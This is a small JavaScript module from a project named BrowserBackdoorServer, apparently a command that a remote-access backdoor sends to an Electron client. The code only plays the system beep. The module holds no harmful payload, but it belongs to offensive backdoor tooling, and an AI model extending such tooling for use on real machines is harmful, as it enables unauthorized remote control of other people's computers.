/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Plays the system beep.
 * Parameters: None
 * Returns: None
 * Author: IMcPwn
 */

if (typeof electron == 'undefined') electron = require('electron');

electron.shell.beep();
